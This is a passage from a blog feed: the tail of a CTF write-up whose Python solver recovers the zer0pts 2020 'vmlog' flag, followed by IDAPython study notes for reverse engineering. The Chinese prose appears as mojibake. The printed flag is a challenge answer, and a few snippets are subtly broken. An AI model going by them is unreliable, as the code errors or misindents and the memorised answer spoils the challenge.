<code>mem[2]</code>ï¼‰ã€‚</li></ul></li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\LeStoreDownload\webpage\CTF\nssctf\[zer0pts 2020]vmlog\tmp\log.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    prev_h = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            arr = <span class="built_in">eval</span>(l.strip())</span><br><span class="line">            <span class="keyword">if</span> arr[<span class="number">4</span>] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> prev_h:</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                        <span class="keyword">if</span> (prev_h + i) * arr[<span class="number">1</span>] % arr[<span class="number">0</span>] == arr[<span class="number">2</span>]:</span><br><span class="line">                            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                prev_h = arr[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#zer0pts&#123;3asy_t0_f0110w_th3_l0g?&#125;</span></span><br></pre></td></tr></table></figure><script src="https://giscus.app/client.js"        data-repo="Samsara-lo/Samsara-lo.github.io"        data-repo-id="R_kgDONimTFg"        data-category="General"        data-category-id="DIC_kwDONimTFs4CorbM"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="bottom"        data-theme="light_high_contrast"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> ç»ƒä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDApythonå­¦ä¹ </title>
      <link href="/2024/12/30/%E5%88%9D%E8%AF%86IDApython/"/>
      <url>/2024/12/30/%E5%88%9D%E8%AF%86IDApython/</url>
      
        <content type="html"><![CDATA[<h1 id="IDApython-amp-IDC"><a href="#IDApython-amp-IDC" class="headerlink" title="IDApython&amp;IDC"></a><strong>IDApython&amp;IDC</strong></h1><p>IDApython å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.hex-rays.com/developer-guide/idapython">IDAPython | Hex-Rays Docs</a></p><p>IDC å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.hex-rays.com/developer-guide/idc">IDC | Hex-Rays Docs</a></p><h1 id="å¸¸ç”¨æ¨¡å—"><a href="#å¸¸ç”¨æ¨¡å—" class="headerlink" title="å¸¸ç”¨æ¨¡å—"></a><strong>å¸¸ç”¨æ¨¡å—</strong></h1><h2 id="1-IDC"><a href="#1-IDC" class="headerlink" title="1.IDC"></a><strong>1.IDC</strong></h2><p>ä¸ IDA å‘½ä»¤è¡Œè¿›è¡Œäº¤äº’çš„æ¨¡å—ï¼Œæä¾›äº†å¾ˆå¤š IDA ä¸­æŒ‡ä»¤ç›¸å…³çš„å‡½æ•°ã€‚</p><ul><li><strong><code>idc.get_name(ea)</code></strong>ï¼šè·å–åœ°å€ <code>ea</code> å¤„çš„åç§°ã€‚</li><li><strong><code>idc.get_func_name(ea)</code></strong>ï¼šè·å–å‡½æ•°åœ°å€å¤„çš„å‡½æ•°åç§°ã€‚</li><li><strong><code>idc.set_name(ea, name)</code></strong>ï¼šä¸ºåœ°å€ <code>ea</code> è®¾ç½®ä¸€ä¸ªæ–°çš„åç§°ã€‚</li><li><strong><code>idc.add_entry(ea, name, start, end)</code></strong>ï¼šåœ¨ <code>ea</code> å¤„æ·»åŠ ä¸€ä¸ªå…¥å£ç‚¹ã€‚</li><li><strong><code>idc.get_func(ea)</code></strong>ï¼šè·å– <code>ea</code> å¤„çš„å‡½æ•°ç»“æ„ã€‚</li></ul><h2 id="2-IDAAPI"><a href="#2-IDAAPI" class="headerlink" title="2.IDAAPI"></a><strong>2.IDAAPI</strong></h2><p>ä¸ IDA çš„æ ¸å¿ƒ API äº¤äº’çš„ä¸»è¦æ¨¡å—ã€‚åŒ…æ‹¬äº†å¯¹ IDA æ ¸å¿ƒå¯¹è±¡çš„è®¿é—®ï¼Œæ¶µç›–äº†åœ°å€ã€å‡½æ•°ã€èŠ‚ç­‰è®¸å¤šåº•å±‚æ“ä½œã€‚</p><ul><li><strong><code>idaapi.get_func(ea)</code></strong>ï¼šè¿”å›åœ°å€ <code>ea</code> å¤„çš„å‡½æ•°å¯¹è±¡ã€‚</li><li><strong><code>idaapi.get_flags(ea)</code></strong>ï¼šè¿”å›åœ°å€ <code>ea</code> çš„æ ‡å¿—ï¼Œè¡¨ç¤ºå®ƒæ˜¯ä»£ç ã€æ•°æ®è¿˜æ˜¯å…¶ä»–ç±»å‹ã€‚</li><li><strong><code>idaapi.create_data(ea, size, type)</code></strong>ï¼šåœ¨åœ°å€ <code>ea</code> å¤„åˆ›å»ºæ•°æ®ã€‚</li><li><strong><code>idaapi.get_strlit_contents(ea)</code></strong>ï¼šè·å– <code>ea</code> å¤„çš„å­—ç¬¦ä¸²å†…å®¹ã€‚</li><li><strong><code>idaapi.add_func(ea)</code></strong>ï¼šå°†åœ°å€ <code>ea</code> æ·»åŠ ä¸ºä¸€ä¸ªå‡½æ•°ã€‚</li></ul><h2 id="3-IDAUTILS"><a href="#3-IDAUTILS" class="headerlink" title="3.IDAUTILS"></a><strong>3.IDAUTILS</strong></h2><p>å·¥å…·å‡½æ•°ï¼Œå¸®åŠ©åœ¨åæ±‡ç¼–ä¸­è‡ªåŠ¨åŒ–å’Œç®€åŒ–åˆ†æè¿‡ç¨‹ã€‚</p><ul><li><strong><code>idautils.Functions(start, end)</code></strong>ï¼šéå†åœ¨ <code>start</code> åˆ° <code>end</code> åœ°å€èŒƒå›´å†…çš„æ‰€æœ‰å‡½æ•°ã€‚</li><li><strong><code>idautils.DecodeInstruction(ea)</code></strong>ï¼šè§£ç åœ°å€ <code>ea</code> å¤„çš„æŒ‡ä»¤ã€‚</li><li><strong><code>idautils.FindBinary(start, end, pattern, flags)</code></strong>ï¼šåœ¨æŒ‡å®šèŒƒå›´å†…æŸ¥æ‰¾ä¸æ¨¡å¼åŒ¹é…çš„äºŒè¿›åˆ¶æ•°æ®ã€‚</li><li><strong><code>idautils.Heads(start, end)</code></strong>ï¼šéå†åœ°å€èŒƒå›´å†…çš„æ‰€æœ‰æŒ‡ä»¤åœ°å€ã€‚</li></ul><h2 id="4-ida-bytes"><a href="#4-ida-bytes" class="headerlink" title="4.ida_bytes"></a><strong>4.ida_bytes</strong></h2><p><code>ida_bytes</code> æä¾›äº†å¯¹å†…å­˜åŒºåŸŸå­—èŠ‚çº§åˆ«æ“ä½œçš„å‡½æ•°ã€‚</p><ul><li><strong><code>ida_bytes.get_byte(ea)</code></strong>ï¼šè·å– <code>ea</code> å¤„çš„ä¸€ä¸ªå­—èŠ‚</li><li><strong><code>ida_bytes.get_word(ea)</code></strong>ï¼šè·å– <code>ea</code> å¤„çš„ä¸€ä¸ªå­—.</li><li><strong><code>ida_bytes.get_dword(ea)</code></strong>ï¼šè·å– <code>ea</code> å¤„çš„ä¸€ä¸ªåŒå­—ã€‚</li></ul><h2 id="5-ida-struct"><a href="#5-ida-struct" class="headerlink" title="5.ida_struct"></a><strong>5.ida_struct</strong></h2><p><code>ida_struct</code> å¤„ç† IDA ä¸­çš„ç»“æ„ä½“ã€‚ä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥è¯»å–ã€åˆ›å»ºã€ä¿®æ”¹å’Œè®¾ç½®ç»“æ„ä½“ã€‚</p><ul><li><strong><code>ida_struct.get_struc_name(struc)</code></strong>ï¼šè·å–ç»“æ„ä½“çš„åç§°ã€‚</li><li><strong><code>ida_struct.add_struc()</code></strong>ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„ç»“æ„ä½“ã€‚</li><li><strong><code>ida_struct.set_struc_member()</code></strong>ï¼šè®¾ç½®ç»“æ„ä½“æˆå‘˜çš„å±æ€§ã€‚</li></ul><h2 id="6-ida-diskio"><a href="#6-ida-diskio" class="headerlink" title="6.ida_diskio"></a><strong>6.ida_diskio</strong></h2><p><code>ida_diskio</code> æä¾›äº†ä¸ç£ç›˜ IO æ“ä½œç›¸å…³çš„å‡½æ•°ï¼Œä¾‹å¦‚è¯»å–æˆ–å†™å…¥æ–‡ä»¶ã€‚</p><ul><li><strong><code>ida_diskio.get_input_file_path()</code></strong>ï¼šè·å–å½“å‰è¾“å…¥æ–‡ä»¶çš„è·¯å¾„ã€‚</li><li><strong><code>ida_diskio.save_input_file()</code></strong>ï¼šä¿å­˜å½“å‰è¾“å…¥æ–‡ä»¶ã€‚</li></ul><h1 id="å¸¸ç”¨æŠ€å·§"><a href="#å¸¸ç”¨æŠ€å·§" class="headerlink" title="å¸¸ç”¨æŠ€å·§"></a><strong>å¸¸ç”¨æŠ€å·§</strong></h1><h2 id="è·å–åŸºæœ¬å—-ida-get-bb"><a href="#è·å–åŸºæœ¬å—-ida-get-bb" class="headerlink" title="è·å–åŸºæœ¬å— ida_get_bb"></a><strong>è·å–åŸºæœ¬å— ida_get_bb</strong></h2><p><code>ida_get_bb</code> å‡½æ•°çš„åŠŸèƒ½æ˜¯è·å–æŒ‡å®šåœ°å€ <code>ea</code> æ‰€åœ¨çš„åŸºæœ¬å—ï¼ˆBasic Blockï¼‰ã€‚åŸºæœ¬å—æ˜¯æŒ‡åœ¨ç¨‹åºä¸­è¿ç»­çš„ä¸€ç»„æŒ‡ä»¤åºåˆ—ï¼Œè¿™äº›æŒ‡ä»¤åœ¨ç¨‹åºçš„æ§åˆ¶æµå›¾ä¸Šä¸ä¼šè¢«ä¸­æ–­ï¼Œåªæœ‰ä»å¤´åˆ°å°¾çš„é¡ºåºæ‰§è¡Œï¼Œå¹¶ä¸”åªæœ‰åœ¨å—çš„ç»“æŸå¤„æ‰èƒ½è·³å‡ºè¿™ä¸ªå—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ida_get_bb</span>(<span class="params">ea</span>):</span><br><span class="line">    f_blocks = idaapi.FlowChart(idaapi.get_func(ea), flags=idaapi.FC_PREDS)</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> f_blocks:</span><br><span class="line">        <span class="keyword">if</span> block.start_ea &lt;= ea <span class="keyword">and</span> ea &lt; block.end_ea:</span><br><span class="line">            <span class="keyword">return</span> block</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°åŠŸèƒ½æ¦‚è¿°"><a href="#å‡½æ•°åŠŸèƒ½æ¦‚è¿°" class="headerlink" title="å‡½æ•°åŠŸèƒ½æ¦‚è¿°"></a><strong>å‡½æ•°åŠŸèƒ½æ¦‚è¿°</strong></h3><ul><li><strong>è¾“å…¥</strong>ï¼šè™šæ‹Ÿåœ°å€ (<code>ea</code>)ï¼Œå³ç›®æ ‡æŒ‡ä»¤çš„åœ°å€ã€‚</li><li><strong>è¾“å‡º</strong>ï¼šåŒ…å«è¯¥åœ°å€çš„åŸºæœ¬å— (<code>block</code>) æˆ–è€… <code>None</code>ï¼ˆå¦‚æœæœªæ‰¾åˆ°ï¼‰ã€‚</li></ul><h3 id="å‡½æ•°é€»è¾‘"><a href="#å‡½æ•°é€»è¾‘" class="headerlink" title="å‡½æ•°é€»è¾‘"></a><strong>å‡½æ•°é€»è¾‘</strong></h3><ol><li>åˆ©ç”¨ IDA Pro çš„ <code>idaapi.FlowChart</code> ç±»ç”Ÿæˆå½“å‰å‡½æ•°çš„æ§åˆ¶æµå›¾ï¼ˆFlow Chartï¼‰ï¼Œå³å‡½æ•°å†…çš„æ‰€æœ‰åŸºæœ¬å—ã€‚</li><li>éå†æ¯ä¸ªåŸºæœ¬å—ï¼Œæ£€æŸ¥è¯¥åŸºæœ¬å—çš„èµ·å§‹åœ°å€ (<code>start_ea</code>) å’Œç»“æŸåœ°å€ (<code>end_ea</code>)ï¼Œåˆ¤æ–­ç›®æ ‡åœ°å€ (<code>ea</code>) æ˜¯å¦åœ¨è¯¥åŸºæœ¬å—èŒƒå›´å†…ã€‚</li><li>å¦‚æœæ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„åŸºæœ¬å—ï¼Œåˆ™è¿”å›è¯¥åŸºæœ¬å—å¯¹è±¡ã€‚</li><li>å¦‚æœéå†å®Œæ‰€æœ‰åŸºæœ¬å—éƒ½æ²¡æœ‰æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„ï¼Œè¿”å› <code>None</code>ã€‚</li></ol><h2 id="åˆ›å»º-åˆ é™¤å‡½æ•°"><a href="#åˆ›å»º-åˆ é™¤å‡½æ•°" class="headerlink" title="åˆ›å»º / åˆ é™¤å‡½æ•°"></a><strong>åˆ›å»º / åˆ é™¤å‡½æ•°</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idc.add_func(<span class="number">0x401000</span>, <span class="number">0x401050</span>)  <span class="comment"># Create a function starting at 0x401000 and ending at 0x401050</span></span><br><span class="line">idc.del_func(<span class="number">0x401000</span>)  <span class="comment"># Delete the function at 0x401000</span></span><br></pre></td></tr></table></figure><h2 id="è·å–å‡½æ•°çš„åç§°"><a href="#è·å–å‡½æ•°çš„åç§°" class="headerlink" title="è·å–å‡½æ•°çš„åç§°"></a><strong>è·å–å‡½æ•°çš„åç§°</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_func_name(ea)</span><br></pre></td></tr></table></figure><h2 id="éå†æ‰€æœ‰å‡½æ•°å¹¶æ‰“å°å…¶æœ‰æ•ˆåœ°å€å’Œåç§°"><a href="#éå†æ‰€æœ‰å‡½æ•°å¹¶æ‰“å°å…¶æœ‰æ•ˆåœ°å€å’Œåç§°" class="headerlink" title="éå†æ‰€æœ‰å‡½æ•°å¹¶æ‰“å°å…¶æœ‰æ•ˆåœ°å€å’Œåç§°"></a><strong>éå†æ‰€æœ‰å‡½æ•°å¹¶æ‰“å°å…¶æœ‰æ•ˆåœ°å€å’Œåç§°</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> func_ea <span class="keyword">in</span> idautils.Functions(): </span><br><span class="line">func_name = idc.get_func_name(func_ea)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(func_ea), func_name)</span><br></pre></td></tr></table></figure><h2 id="åˆ—å‡ºåœ°å€çš„äº¤å‰å¼•ç”¨ï¼š"><a href="#åˆ—å‡ºåœ°å€çš„äº¤å‰å¼•ç”¨ï¼š" class="headerlink" title="åˆ—å‡ºåœ°å€çš„äº¤å‰å¼•ç”¨ï¼š"></a><strong>åˆ—å‡ºåœ°å€çš„äº¤å‰å¼•ç”¨ï¼š</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> xref <span class="keyword">in</span> idautils.XrefsFrom(<span class="number">0x401000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Xref from 0x401000 to <span class="subst">&#123;<span class="built_in">hex</span>(xref.to)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="éå†æ‰€æœ‰äº¤å‰å¼•ç”¨å¹¶æ‰“å°"><a href="#éå†æ‰€æœ‰äº¤å‰å¼•ç”¨å¹¶æ‰“å°" class="headerlink" title="éå†æ‰€æœ‰äº¤å‰å¼•ç”¨å¹¶æ‰“å°"></a><strong>éå†æ‰€æœ‰äº¤å‰å¼•ç”¨å¹¶æ‰“å°</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for ref in idautils.XrefsTo(ea):</span><br><span class="line">  print(hex(ref.frm))</span><br></pre></td></tr></table></figure><h2 id="è·å–æ®µåœ°å€"><a href="#è·å–æ®µåœ°å€" class="headerlink" title="è·å–æ®µåœ°å€"></a>è·å–æ®µåœ°å€</h2><p><code>idautils.Segments()</code> è¿”å› <strong>æ‰€æœ‰æ®µçš„èµ·å§‹åœ°å€</strong>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">    seg_name = idc.get_segm_name(seg)</span><br><span class="line">    <span class="keyword">if</span> seg_name != <span class="string">&quot;.text&quot;</span> <span class="keyword">and</span> seg_name != <span class="string">&quot;UPX0&quot;</span>:</span><br><span class="line">        <span class="comment"># print(f&quot;è·³è¿‡æ®µ: &#123;seg_name&#125; (0x&#123;seg:X&#125;)&quot;)</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æ­£åœ¨å¤„ç†æ®µ: <span class="subst">&#123;seg_name&#125;</span> (0x<span class="subst">&#123;seg:X&#125;</span>)&quot;</span>)</span><br><span class="line">    start_ea = seg</span><br><span class="line">    end_ea = idc.get_segm_end(seg) <span class="comment">#è¿”å›æ®µçš„ç»“æŸåœ°å€ã€‚</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ–‡æœ¬-æŒ‡ä»¤æœç´¢"><a href="#æ–‡æœ¬-æŒ‡ä»¤æœç´¢" class="headerlink" title="æ–‡æœ¬ / æŒ‡ä»¤æœç´¢"></a><strong>æ–‡æœ¬ / æŒ‡ä»¤æœç´¢</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœç´¢æ•´ä¸ªå†…å­˜åŒºåŸŸçš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_string</span>(<span class="params">pattern</span>):</span><br><span class="line">    <span class="keyword">for</span> ea <span class="keyword">in</span> idautils.Strings():</span><br><span class="line">        <span class="keyword">if</span> pattern <span class="keyword">in</span> ea:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found string at <span class="subst">&#123;<span class="built_in">hex</span>(ea)&#125;</span>: <span class="subst">&#123;ea&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœç´¢ &quot;Hello&quot; å­—ç¬¦ä¸²</span></span><br><span class="line">search_string(<span class="string">&quot;Hello&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æœç´¢æ±‡ç¼–æŒ‡ä»¤</span></span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_asm_instruction</span>(<span class="params">pattern</span>):</span><br><span class="line">    <span class="comment"># éå†æ•´ä¸ªç¨‹åºçš„æ‰€æœ‰æŒ‡ä»¤</span></span><br><span class="line">    <span class="keyword">for</span> ea <span class="keyword">in</span> idautils.Heads(idc.get_segm_by_name(<span class="string">&quot;.text&quot;</span>), idc.get_segm_end(idc.get_segm_by_name(<span class="string">&quot;.text&quot;</span>))):</span><br><span class="line">        disasm = idc.GetDisasm(ea)  <span class="comment"># è·å–åœ°å€å¤„çš„åæ±‡ç¼–æŒ‡ä»¤</span></span><br><span class="line">        <span class="keyword">if</span> pattern <span class="keyword">in</span> disasm:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found instruction at <span class="subst">&#123;<span class="built_in">hex</span>(ea)&#125;</span>: <span class="subst">&#123;disasm&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœç´¢ &quot;mov eax, ebx&quot; æŒ‡ä»¤</span></span><br><span class="line">search_asm_instruction(<span class="string">&quot;mov eax, ebx&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="å¾ªç¯å·¦ç§»-å³ç§»"><a href="#å¾ªç¯å·¦ç§»-å³ç§»" class="headerlink" title="å¾ªç¯å·¦ç§» / å³ç§»"></a><strong>å¾ªç¯å·¦ç§» / å³ç§»</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ROR</span>(<span class="params">i,index</span>):<span class="comment">#å¾ªç¯åˆç§»</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(index):</span><br><span class="line">        tmp = tmp[-<span class="number">1</span>] + tmp[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp, <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">i,index</span>):<span class="comment">#å¾ªç¯å·¦ç§»</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(index):</span><br><span class="line">        tmp = tmp[<span class="number">1</span>:] + tmp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp, <span class="number">2</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å®ä¾‹</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">def ROR(i,index):</span><br><span class="line">    tmp = bin(i)[2:].rjust(8,&quot;0&quot;)</span><br><span class="line">    for _ in range(index):</span><br><span class="line">        tmp = tmp[-1] + tmp[:-1]</span><br><span class="line">    return int(tmp, 2)</span><br><span class="line">    </span><br><span class="line">addr1=0x140001085</span><br><span class="line">addr2=0x140001d00</span><br><span class="line">for i in range(addr2-addr1):</span><br><span class="line">    PatchByte(addr1+i,ROR(Byte(addr1+i),3)^90)</span><br><span class="line">print(&#x27;successful&#x27;)</span><br></pre></td></tr></table></figure><h2 id="åˆ—å‡º-segment-å‡½æ•°ï¼ˆä»¥åŠå®ƒä»¬çš„äº¤å‰å¼•ç”¨ï¼‰"><a href="#åˆ—å‡º-segment-å‡½æ•°ï¼ˆä»¥åŠå®ƒä»¬çš„äº¤å‰å¼•ç”¨ï¼‰" class="headerlink" title="åˆ—å‡º segment å‡½æ•°ï¼ˆä»¥åŠå®ƒä»¬çš„äº¤å‰å¼•ç”¨ï¼‰"></a><strong>åˆ—å‡º segment å‡½æ•°ï¼ˆä»¥åŠå®ƒä»¬çš„äº¤å‰å¼•ç”¨ï¼‰</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_xref</span><br><span class="line"><span class="keyword">import</span> ida_auto</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ida_auto.auto_wait()  <span class="comment"># ç¡®ä¿ IDA å®Œæˆè‡ªåŠ¨åˆ†æ</span></span><br><span class="line">    ea = ida_kernwin.get_screen_ea()</span><br><span class="line">    seg = ida_segment.getseg(ea)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> seg:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No segment found at 0x%x&quot;</span> % ea)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    func = ida_funcs.get_func(seg.start_ea)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> func:</span><br><span class="line">        func = ida_funcs.get_next_func(seg.start_ea)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> func <span class="keyword">and</span> func.start_ea &lt; seg.end_ea:</span><br><span class="line">        funcea = func.start_ea</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Function %s at 0x%x&quot;</span> % (ida_funcs.get_func_name(funcea), funcea))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æŸ¥æ‰¾å¯¹ funcea çš„äº¤å‰å¼•ç”¨</span></span><br><span class="line">        xb = ida_xref.xrefblk_t()</span><br><span class="line">        <span class="keyword">if</span> xb.first_to(funcea, ida_xref.XREF_ALL):</span><br><span class="line">            <span class="keyword">while</span> xb.iscode:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  called from %s(0x%x)&quot;</span> % (ida_funcs.get_func_name(xb.frm), xb.frm))</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> xb.next_to():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        func = ida_funcs.get_next_func(funcea)</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åˆ—å‡º-segment-ä¸­çš„æ‰€æœ‰å‡½æ•°-ï¼ˆå’Œäº¤å‰å¼•ç”¨ï¼‰"><a href="#åˆ—å‡º-segment-ä¸­çš„æ‰€æœ‰å‡½æ•°-ï¼ˆå’Œäº¤å‰å¼•ç”¨ï¼‰" class="headerlink" title="åˆ—å‡º segment ä¸­çš„æ‰€æœ‰å‡½æ•° ï¼ˆå’Œäº¤å‰å¼•ç”¨ï¼‰"></a><strong>åˆ—å‡º segment ä¸­çš„æ‰€æœ‰å‡½æ•° ï¼ˆå’Œäº¤å‰å¼•ç”¨ï¼‰</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 